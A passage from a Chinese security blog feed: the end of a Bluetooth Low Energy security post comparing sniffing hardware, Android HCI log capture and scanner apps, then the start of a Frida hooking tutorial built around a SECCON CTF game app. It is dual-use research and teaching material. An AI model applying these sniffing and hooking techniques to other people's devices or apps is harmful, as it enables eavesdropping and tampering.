Dongle稳定，经常会抓不到后面数据通信的网络包，不过这一问题应该是可以通过优化算法得到解决的，但需要对官方的固件进行逆向或自己根据Nordic公司提供的BLE协议栈重写代码。。</p><p><a href="https://user-images.githubusercontent.com/11291711/49984347-9e466b00-ffa2-11e8-943a-caef7f703349.jpg"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984347-9e466b00-ffa2-11e8-943a-caef7f703349.jpg" alt="img"></a></p><p><a href="https://user-images.githubusercontent.com/11291711/49984319-9981b700-ffa2-11e8-9850-dd3b4187f32f.jpg"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984319-9981b700-ffa2-11e8-9850-dd3b4187f32f.jpg" alt="img"></a></p><p><a href="https://user-images.githubusercontent.com/11291711/49984323-9981b700-ffa2-11e8-8e99-1ef51eab3cd2.jpg"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984323-9981b700-ffa2-11e8-8e99-1ef51eab3cd2.jpg" alt="img"></a></p><p><a href="https://user-images.githubusercontent.com/11291711/49984325-9a1a4d80-ffa2-11e8-8c4b-23c0b851d5da.jpg"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984325-9a1a4d80-ffa2-11e8-8c4b-23c0b851d5da.jpg" alt="img"></a></p><p>优点：</p><ul><li>价格便宜，USB Dongle淘宝价70元左右，整套开发板售价约200软妹币上下</li><li>无需事先在3个广播信道中指定其一进行守候，只要指定要监听的设备，就会自动进行追踪</li><li>官方提供的BLE Sniffer程序可配合Wireshark工具对嗅探到的低功耗蓝牙数据包进行解析，能够很直观的显示出内部的层级关系和各字段含义</li></ul><p>缺点：</p><ul><li>不用指定广播信道，确实操作起来比较方便，但与之相对的是经常无法抓到后面的通信数据包。无论是作为开发用的调试工具，还是分析用的嗅探工具，都不够理想</li></ul><h5 id><a href="#" class="headerlink" title></a></h5><h3 id="2-商业侦听工具"><a href="#2-商业侦听工具" class="headerlink" title="2. 商业侦听工具"></a>2. 商业侦听工具</h3><h4 id="a-Frontline-BPA®-600"><a href="#a-Frontline-BPA®-600" class="headerlink" title="a. Frontline BPA® 600"></a>a. Frontline BPA® 600</h4><p>Frontline Test Equipment——“前线测试设备”（简称“前线”，Frontline），主要是针对各种各样的协议所做的一个“协议分析器”。“前线”系统的销售策略是“卖硬件，送软件”，而软件自然是和硬件相关联的，其侦听范围包括SCADA系统、RS-232串口通信、Ethernet以太网通信、ZigBee网络通信，以及蓝牙网络技术。Frontline旗下的BPA® 600双模蓝牙协议分析仪，能够把从空中获取到的基础速率/ 增强数据速率（BR/EDR）的传统蓝牙无线通信和低功耗蓝牙无线通信数据同时直观的显示出来。</p><p><a href="https://user-images.githubusercontent.com/11291711/49984340-9c7ca780-ffa2-11e8-9f1a-ef9a2fca5d95.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984340-9c7ca780-ffa2-11e8-9f1a-ef9a2fca5d95.png" alt="img"></a></p><p><a href="https://user-images.githubusercontent.com/11291711/49984338-9c7ca780-ffa2-11e8-8c9c-71b47e26f060.jpg"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984338-9c7ca780-ffa2-11e8-8c9c-71b47e26f060.jpg" alt="img"></a></p><p>优点：</p><ul><li>无角色指定链路抓取意味着在初始化设置时不再需要指定哪个设备是主设备（master），哪个设备是从设备（slave）</li><li>能够同时可视化的监视低功耗蓝牙技术所使用的三个广播信道</li><li>同时抓取和解密多条蓝牙链路</li><li>链路密钥可自动从第三方软件或调试工具导入到BPA 600</li><li>支持蓝牙SIG组织发布的所有的协议和应用层协议，完全支持蓝牙4.1版本</li></ul><p>缺点：</p><ul><li>十分昂贵，<a href="http://www.fte.com/">官网</a>上虽并未公布具体的价格信息，需要与对方进行联系，但淘宝价格在15万左右</li><li>需要捕获到蓝牙的“连接建立”过程，对于已经建立好连接的蓝牙网络，无法从一个正在处理的进程中，嗅探到这个“微微网”里面的通信数据包</li></ul><h4 id="b-Ellisys-BEX400"><a href="#b-Ellisys-BEX400" class="headerlink" title="b. Ellisys BEX400"></a>b. Ellisys BEX400</h4><p>Ellisys公司的BLuetooth Explorer 400（简称“BEX400”），是个独特的蓝牙数据通信捕获系统。它使用了一个wideband的接收器，能够同时侦听蓝牙整个79MHz的所有频谱。通过这种无线接入方法，嗅探蓝牙数据包以及对蓝牙活动的评估变得很容易。在BEX400强大的宽带接收能力支持下，我们能够同时捕获蓝牙的所有活动，且无需指定“蓝牙设备地址”信息。此外，该设备在捕获一个“微微网”中的蓝牙通信数据时，既可以是在连接建立前，也可以在连接建立后</p><p><a href="https://user-images.githubusercontent.com/11291711/49984339-9c7ca780-ffa2-11e8-9052-bc6aa1aa6bd1.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984339-9c7ca780-ffa2-11e8-9052-bc6aa1aa6bd1.png" alt="img"></a></p><p>优点：</p><ul><li>对于BLE的流量捕获没有必须在建立连接前就开始嗅探的限制</li><li>能够同时侦听蓝牙的所有信道，且无需指定“蓝牙设备地址”信息</li></ul><p>缺点：</p><ul><li>价格极其昂贵</li><li>除价格外，几乎完全符合需求，暂未发现明显缺点</li></ul><h3 id="3-开源侦听工具Ubertooth"><a href="#3-开源侦听工具Ubertooth" class="headerlink" title="3. 开源侦听工具Ubertooth"></a>3. 开源侦听工具Ubertooth</h3><p>“超牙项目”（Project Ubertooth）是一个开源的硬件项目，由Great Scott Gadgets团队的Michael Ossmann开发。超牙的硬件系统，目前处于版本为1的阶段，称为“超牙一号”（Ubertooth One）。通过这个工具，可以创建属于自己的“传统蓝牙”和“低功耗蓝牙”底层通信数据包捕获工具。</p><p><a href="https://user-images.githubusercontent.com/11291711/49984348-9e466b00-ffa2-11e8-93ae-59086af28fb8.jpeg"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984348-9e466b00-ffa2-11e8-93ae-59086af28fb8.jpeg" alt="img"></a></p><p>此外，Ubertooth的固件源代码，可以直接从github：<a href="https://github.com/greatscottgadgets/ubertooths">https://github.com/greatscottgadgets/ubertooth</a>下载到最新的发布版。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200928121643528.png" alt="image-20200928121643528"></p><p>优点：</p><ul><li>售价约120美元，比较亲民</li><li>本身是一个开源的硬件和软件工程，其设计目的就是用来进行蓝牙网络的嗅探，便于研究员和黑客使用</li><li>针对不同的蓝牙规范，具有不同的应对工具，支持传统蓝牙和低功耗蓝牙两种数据包的捕获</li><li>能够在混杂模式下进行跟踪，通过ubertooth-btle程序对捕获的数据包进行识别和匹配，进而确定“访问地址”、“循环冗余校验”初始值、“跳转间隔”、“跳转增量”等，并还原出数据包的值</li></ul><p>缺点：</p><ul><li>说是支持“传统蓝牙”，但其实只能捕获“基本速率蓝牙”在网络中的活动，并不支持后来的“增强速率蓝牙”在规范改进后的设备。不过这与我们的工作没有太大联系，主要关注的应是低功耗蓝牙</li></ul><h2 id="0x08-移动端工具"><a href="#0x08-移动端工具" class="headerlink" title="0x08 移动端工具"></a>0x08 移动端工具</h2><h3 id="1-Android手机抓取app蓝牙数据"><a href="#1-Android手机抓取app蓝牙数据" class="headerlink" title="1. Android手机抓取app蓝牙数据"></a>1. Android手机抓取app蓝牙数据</h3><h4 id="a-Android蓝牙HCI日志"><a href="#a-Android蓝牙HCI日志" class="headerlink" title="a .Android蓝牙HCI日志"></a><strong>a .Android蓝牙HCI日志</strong></h4><p>在部分Android机型为开发人员提供了保存蓝牙日志的选项，即可保存手机向设备发送的数据和设备响应的数据，打开方式如下：</p><p>开发者模式→蓝牙HCI日志</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200930155140338.png" alt="image-20200930155140338"></p><p>不同的平台存放HCI log的路径会不一样，MTK存放HCI log的路径为<code>/sdcard/mtklog/btlog/btsnoop_hci.log</code>，高通的存放路径为<code>/sdcard/btsnoop_hci.log</code></p><p>如果上面提到的路径下都没有HCI log，还可以通过手机上的蓝牙配置文件<code>bt_stack.conf</code>来查看路径</p><p><code>bt_stack.conf</code>位于<code>/etc/bluetooth/路径下，HCI log路径通过</code>BtSnoopFileName=/sdcard/btsnoop_hci.log`来进行设置的</p><p>另外如果没有<code>bt_stack.conf</code>文件，设备也会在默认路径下生成日志：<code>/data/misc/bluetooth/logs/btsnoop_hci.log</code></p><p>之后导出到wireshark查看即可，如图清晰的展示了蓝牙各协议栈的内容，分析时候重点关注发送的数据内容即<code>Handle</code>、<code>uuid</code>、<code>Value</code>等值即可</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49418350-b6590600-f7bc-11e8-8cea-fbd09c9c318c.png" alt="img"></p><h4 id="b-Bluez调试工具hcidump"><a href="#b-Bluez调试工具hcidump" class="headerlink" title="b. Bluez调试工具hcidump"></a><strong>b. Bluez调试工具hcidump</strong></h4><p>虽然Android 4.2已经将蓝牙协议栈替换为Bluedroid，但仍可使用BlueZ调试工具（需自行编译，或网上下载），且hcidump输出的数据与<code>开发者模式</code>里的<code>蓝牙HCI日志</code>基本一样，源码如下：</p><p><a href="https://android.googlesource.com/platform/external/bluetooth/bluez/+/android-4.1.2_r1">https://android.googlesource.com/platform/external/bluetooth/bluez/+/android-4.1.2_r1</a></p><p>hcidump抓取 log :</p><ul><li>打开蓝牙</li><li>用adb shell 登陆android设备 并且用 <code>hcidump -w /sdcard/hcilog</code></li><li>开始测试</li><li>测试完成，停止hcidump</li><li>导出到wireshark分析 <code>hcilog</code> 文件</li></ul><h3 id="2-扫描器"><a href="#2-扫描器" class="headerlink" title="2. 扫描器"></a>2. 扫描器</h3><h4 id="a-LightBlue"><a href="#a-LightBlue" class="headerlink" title="a. LightBlue"></a>a. LightBlue</h4><p><code>LightBlue</code>使用简单，打开蓝牙和app，即自动扫描蓝牙设备，未连接之前，大部分设备都是<code>Unnamed</code>和<code>No services</code>，选择其中一个会尝试连接，连接成功后即可获取蓝牙设备的设备信息、UUID、服务等信息了，选择其中一个服务，还可以尝试对其读写数据</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200930161720845.png" alt="image-20200930161720845"></p><h4 id="b-nRF-Connect"><a href="#b-nRF-Connect" class="headerlink" title="b. nRF Connect"></a>b. nRF Connect</h4><p><code>nRF Connect</code>的使用方式和<code>LightBlue</code>基本一致，优点在于对设备服务信息展示更为直观：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200930161645370.png" alt="image-20200930161645370"></p><h2 id="0x09-针对利用蓝牙的应用攻击（私有协议）"><a href="#0x09-针对利用蓝牙的应用攻击（私有协议）" class="headerlink" title="0x09 针对利用蓝牙的应用攻击（私有协议）"></a>0x09 针对利用蓝牙的应用攻击（私有协议）</h2><p>目前针对私有协议的分析基本都是通过蓝牙dongle抓包例如CC2540，并且逆向app进行分析应用实现是否安全。</p><ul><li><a href="http://drops.xmd5.com/static/drops/tips-10109.html">YeeLight 2 代蓝牙灯泡，小爱爱智能跳蛋，小米手环</a></li><li><a href="https://future-sec.com/how-to-crack-a-ble-lock.html">如何破解一个蓝牙锁</a></li><li><a href="http://www.droidsec.cn/ble安全入门及实战（1）/">BLE安全入门及实战（1）</a></li><li><a href="https://www.secpulse.com/archives/75963.html">BLE安全入门及实战（2）</a></li><li><a href="https://www.secpulse.com/archives/76377.html">BLE安全入门及实战（3）</a></li><li><a href="https://blog.csdn.net/u013183495/article/details/51736605">体脂秤</a></li></ul><h2 id="0x10-可以研究的点"><a href="#0x10-可以研究的点" class="headerlink" title="0x10 可以研究的点"></a>0x10 可以研究的点</h2><p>经过多年的历史发展，蓝牙本身已经变成一个比较复杂的协议了，如果需要整理完整的攻击面需要对整个蓝牙的实现有很清晰的梳理，网上大部分的文章都是关于协议本身的，对于协议的实现还是说的不是很清楚。而且协议本身的发展方向就是IOT方向，例如GATT这种很明显就是支持物联网设备的协议。所以搞清BLE5.0在真实的物联网设备上的架构以及实现我认为非常关键。</p><h2 id="0x11-参考链接"><a href="#0x11-参考链接" class="headerlink" title="0x11 参考链接"></a>0x11 参考链接</h2><p><a href="https://xuanxuanblingbling.github.io/wireless/ble/2018/08/01/ble/">https://xuanxuanblingbling.github.io/wireless/ble/2018/08/01/ble/</a></p><p><a href="http://www.gandalf.site/2019/02/ble.html">http://www.gandalf.site/2019/02/ble.html</a></p><p><a href="https://www.ndss-symposium.org/wp-content/uploads/2019/02/ndss2019_06B-4_Xu_paper.pdf">https://www.ndss-symposium.org/wp-content/uploads/2019/02/ndss2019_06B-4_Xu_paper.pdf</a></p><p><a href="http://drops.xmd5.com/static/drops/tips-10109.html">http://drops.xmd5.com/static/drops/tips-10109.html</a></p><p><a href="https://blog.csdn.net/u013183495/article/details/51736605">https://blog.csdn.net/u013183495/article/details/51736605</a></p><p><a href="https://www.secpulse.com/archives/75963.html">https://www.secpulse.com/archives/75963.html</a></p><h2 id="更新中…"><a href="#更新中…" class="headerlink" title="更新中…"></a>更新中…</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;放大佬总结的一张图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/BLE%E5%AE%89%E5%85%A8.png&quot; alt=&quot;BLE安全&quot;&gt;&lt;/p&gt;
&lt;p&gt;蓝牙是一种无线通信标准，工作
      
    
    </summary>
    
    
      <category term="IOT" scheme="http://www.ol4three.com/categories/IOT/"/>
    
    
      <category term="BLE" scheme="http://www.ol4three.com/tags/BLE/"/>
    
      <category term="蓝牙" scheme="http://www.ol4three.com/tags/%E8%93%9D%E7%89%99/"/>
    
  </entry>
  
  <entry>
    <title>Hook框架Firada</title>
    <link href="http://www.ol4three.com/2020/09/22/Android/Hook%E6%A1%86%E6%9E%B6Firada/"/>
    <id>http://www.ol4three.com/2020/09/22/Android/Hook%E6%A1%86%E6%9E%B6Firada/</id>
    <published>2020-09-22T03:53:39.000Z</published>
    <updated>2020-12-01T11:47:03.817Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h2><p>Frida是个轻量级别的hook框架</p><p><strong>是Python API，但JavaScript调试逻辑</strong></p><p>Frida的核心是用C编写的，并将<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fdevelopers.google.com%2Fv8%2F">Google的V8引擎</a>注入到目标进程中，在这些进程中，JS可以完全访问内存，挂钩函数甚至调用进程内的本机函数来执行。</p><p>使用Python和JS可以使用无风险的API进行快速开发。Frida可以帮助您轻松捕获JS中的错误并为您提供异常而不是崩溃。<br> 。<br> 关于frda学习路线了，Frida的学习还是蛮简单的，只需要了解两方面的内容：<br> 1）主控端和目标进程的交互（message）<br> 2）Python接口和js接口（查文档）</p><p>frida框架分为两部分：<br> 1）一部分是运行在系统上的交互工具frida CLI。<br> 2）另一部分是运行在目标机器上的代码注入工具 frida-serve。</p><h2 id="0x01-资源和环境"><a href="#0x01-资源和环境" class="headerlink" title="0x01 资源和环境"></a>0x01 资源和环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Mac Os 10.15.5</span><br><span class="line">Python 3.7</span><br><span class="line">Google Nexus 6P Anroid 6.0.1</span><br><span class="line">Frida官网：https:&#x2F;&#x2F;www.frida.re&#x2F;</span><br><span class="line">Frida源码：https:&#x2F;&#x2F;github.com&#x2F;frida</span><br></pre></td></tr></table></figure><h2 id="0x02-运行模式"><a href="#0x02-运行模式" class="headerlink" title="0x02 运行模式"></a>0x02 运行模式</h2><p>Frida通过其强大的仪器核心Gum提供动态检测，Gum是用C语言编写的。因为这种检测逻辑很容易发生变化，所以通常需要用脚本语言编写，这样在开发和维护它时会得到一个简短的反馈循环。这就是GumJS发挥作用的地方。只需几行C就可以在运行时内运行一段JavaScript，它可以完全访问Gum的API，允许您挂钩函数，枚举加载的库，导入和导出的函数，读写内存，扫描模式的内存等</p><h2 id="0x03-Frida安装"><a href="#0x03-Frida安装" class="headerlink" title="0x03 Frida安装"></a>0x03 Frida安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install frida</span><br><span class="line">pip install frida-tools</span><br><span class="line">frida --version</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200922142344067.png" alt="image-20200922142344067"></p><p>安卓端安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;frida&#x2F;frida&#x2F;releases</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;cpuinfo</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200922143332932.png" alt="image-20200922143332932"></p><p>看到我的cpu是armv8 64位的 所以对应的去下载相应的版本</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200922143734995.png" alt="image-20200922143734995"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">adb push frida-server-12.11.17-android-arm64 &#x2F;data&#x2F;local&#x2F;tmp</span><br><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line">cd &#x2F;data&#x2F;local&#x2F;tmp</span><br><span class="line">chmod 777 frida-server-12.11.17-android-arm64</span><br><span class="line">.&#x2F;frida-server-12.11.17-android-arm64</span><br></pre></td></tr></table></figure><p>在bash下frida-ps -U</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200922144633734.png" alt="image-20200922144633734"></p><h2 id="0x04-Hook示例的安装与分析"><a href="#0x04-Hook示例的安装与分析" class="headerlink" title="0x04 Hook示例的安装与分析"></a>0x04 Hook示例的安装与分析</h2><p>Frida官网给我们了一个ctf的示例，就以此为例子，开始学习frida在android逆向的使用。<br>rps.apk <a href="https://github.com/ctfs/write-ups-2015/raw/master/seccon-quals-ctf-2015/binary/reverse-engineering-android-apk-1/rps.apk">下载地址</a></p><p>使用虚拟机或者自己的手机将应用安装好，发现是一个简单的石头剪刀布的游戏应用，简单的玩了一下，没什么特别的，直接分析代码吧，看看到底想干什么。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200923103121714.png" alt="image-20200923103121714"></p><h3 id="源代码分析"><a href="#源代码分析" class="headerlink" title="源代码分析"></a>源代码分析</h3><p>使用jadx-gui反编译，发现app没有加壳和混淆，当然一来就加壳和混淆的话对我们就太不友好了，接下分析就简单了，直接看java代码。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200923103824726.png" alt="image-20200923103824726"></p><p>在MainActivity中找到OnCreate()方法，可以看到只是简单的声明了button控件以及对应的监听器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">protected void onCreate(Bundle paramBundle) &#123;</span><br><span class="line">  super.onCreate(paramBundle);</span><br><span class="line">  setContentView(2130968600);</span><br><span class="line">  this.P &#x3D; (Button)findViewById(2131492941);</span><br><span class="line">  this.S &#x3D; (Button)findViewById(2131492943);</span><br><span class="line">  this.r &#x3D; (Button)findViewById(2131492942);</span><br><span class="line">  this.P.setOnClickListener(this);</span><br><span class="line">  this.r.setOnClickListener(this);</span><br><span class="line">  this.S.setOnClickListener(this);</span><br><span class="line">  this.flag &#x3D; 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续查看button的onclick方法，可以看出cpu是通过随机数组出的，其判断输赢的方法在this.showMessageTask中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">public void onClick(View paramView) &#123;</span><br><span class="line">   if (this.flag &#x3D;&#x3D; 1)</span><br><span class="line">     return; </span><br><span class="line">   this.flag &#x3D; 1;</span><br><span class="line">   ((TextView)findViewById(2131492946)).setText(&quot;&quot;);</span><br><span class="line">   TextView textView1 &#x3D; (TextView)findViewById(2131492944);</span><br><span class="line">   TextView textView2 &#x3D; (TextView)findViewById(2131492945);</span><br><span class="line">   this.m &#x3D; 0;</span><br><span class="line">   this.n &#x3D; (new Random()).nextInt(3);&#x2F;&#x2F;随机数0，1，2</span><br><span class="line">   int i &#x3D; this.n;</span><br><span class="line">   (new String[3])[0] &#x3D; &quot;CPU: Paper&quot;;</span><br><span class="line">   (new String[3])[1] &#x3D; &quot;CPU: Rock&quot;;</span><br><span class="line">   (new String[3])[2] &#x3D; &quot;CPU: Scissors&quot;;</span><br><span class="line">   textView2.setText((new String[3])[i]);</span><br><span class="line">   if (paramView &#x3D;&#x3D; this.P) &#123;</span><br><span class="line">     textView1.setText(&quot;YOU: Paper&quot;);</span><br><span class="line">     this.m &#x3D; 0;</span><br><span class="line">   &#125; </span><br><span class="line">   if (paramView &#x3D;&#x3D; this.r) &#123;</span><br><span class="line">     textView1.setText(&quot;YOU: Rock&quot;);</span><br><span class="line">     this.m &#x3D; 1;</span><br><span class="line">   &#125; </span><br><span class="line">   if (paramView &#x3D;&#x3D; this.S) &#123;</span><br><span class="line">     textView1.setText(&quot;YOU: Scissors&quot;);</span><br><span class="line">     this.m &#x3D; 2;</span><br><span class="line">   &#125; </span><br><span class="line">   this.handler.postDelayed(this.showMessageTask, 1000L);&#x2F;&#x2F;输赢判断方法</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>跟进分析showMessageTask，可以看到如果赢了mainActivity.cnt会+1，但是一旦输了cnt就会置0，而获取flag的要求是我们得获胜1000次，…… :(</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">private final Runnable showMessageTask &#x3D; new Runnable() &#123;</span><br><span class="line">    public void run() &#123;</span><br><span class="line">      TextView textView &#x3D; (TextView)MainActivity.this.findViewById(2131492946);</span><br><span class="line">      if (MainActivity.this.n - MainActivity.this.m &#x3D;&#x3D; 1) &#123;</span><br><span class="line">        MainActivity mainActivity &#x3D; MainActivity.this;</span><br><span class="line">        mainActivity.cnt++;</span><br><span class="line">        textView.setText(&quot;WIN! +&quot; + String.valueOf(MainActivity.this.cnt));</span><br><span class="line">      &#125; else if (MainActivity.this.m - MainActivity.this.n &#x3D;&#x3D; 1) &#123;</span><br><span class="line">        MainActivity.this.cnt &#x3D; 0;</span><br><span class="line">        textView.setText(&quot;LOSE +0&quot;);</span><br><span class="line">      &#125; else if (MainActivity.this.m &#x3D;&#x3D; MainActivity.this.n) &#123;</span><br><span class="line">        textView.setText(&quot;DRAW +&quot; + String.valueOf(MainActivity.this.cnt));</span><br><span class="line">      &#125; else if (MainActivity.this.m &lt; MainActivity.this.n) &#123;</span><br><span class="line">        MainActivity.this.cnt &#x3D; 0;</span><br><span class="line">        textView.setText(&quot;LOSE +0&quot;);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        MainActivity mainActivity &#x3D; MainActivity.this;</span><br><span class="line">        mainActivity.cnt++;</span><br><span class="line">        textView.setText(&quot;WIN! +&quot; + String.valueOf(MainActivity.this.cnt));</span><br><span class="line">      &#125; </span><br><span class="line">      if (1000 &#x3D;&#x3D; MainActivity.this.cnt)</span><br><span class="line">        textView.setText(&quot;SECCON&#123;&quot; + String.valueOf((MainActivity.this.cnt + MainActivity.this.calc()) * 107) + &quot;&#125;&quot;); </span><br><span class="line">      MainActivity.this.flag &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>简单分析一下获取flag需要的条件，总结有3个办法:</p><ol><li>分析calc()方法能算出答案，但这个方法在so中，得分析汇编代码才行，当然可以尝试使用ida pro，F5查看C代码分析，前提是算法不难。</li><li>获取calc函数的返回值，从而计算答案。</li><li>还有一个方法就是，直接将MainActivity.this.cnt的值构造成1000。</li></ol><p>接下来就用frida，使用后两种思路来解这个简单的示例。但在这之前得先了解Frida自带的Messages机制，了解frida怎么从通过一个python脚本发送和接收message消息是一个提升理解frida的好方法。</p><h2 id="0x04-Frida自带的Messages机制与进程交互"><a href="#0x04-Frida自带的Messages机制与进程交互" class="headerlink" title="0x04 Frida自带的Messages机制与进程交互"></a>0x04 Frida自带的Messages机制与进程交互</h2><p>先来看看一个Messages的模板，这里用到的语言分别是python和javascript，他们之间的关系是python作为载体，javascript作为在android中真正执行代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"> </span><br><span class="line"><span class="comment">#hook代码，采用javascript编写</span></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">//javascript代码，重点</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#自定义回调函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span>(<span class="params">message, data</span>):</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        print(<span class="string">&quot;[*] &#123;0&#125;&quot;</span>.format(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(message)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#重点的4行代码</span></span><br><span class="line">process = frida.get_usb_device().attach(<span class="string">&#x27;应用完整包名&#x27;</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p>当然如果是对此简单的使用，只需要编写jscode，以及填写你要hook的应用完整包名就行了，不过如果单纯只会用可能在以后会被模板限制，所以一探究竟还是很有必要。<br>可以在Bash中，使用python终端的help()函数找到frida库的源代码的绝对路径。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import frida</span><br><span class="line">help(frida)</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200923112932246.png" alt="image-20200923112932246"></p><p>接下来就来具体看看这几句代码做了什么事情。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">process &#x3D; frida.get_usb_device().attach(&#39;应用完整包名&#39;)</span><br><span class="line">script &#x3D; process.create_script(jscode)</span><br><span class="line">script.on(&#39;message&#39;, on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p>首先使用了frida.get_usb_device()，返回了一个_get_device函数，跟进_get_device方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def get_usb_device(timeout &#x3D; 0):</span><br><span class="line">    return _get_device(lambda device: device.type &#x3D;&#x3D; &#39;tether&#39;, timeout)</span><br></pre></td></tr></table></figure><p>在_get_device中，通过get_device_manager()实例化DeviceManager类，并调用该类中的enumerate_devices()方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 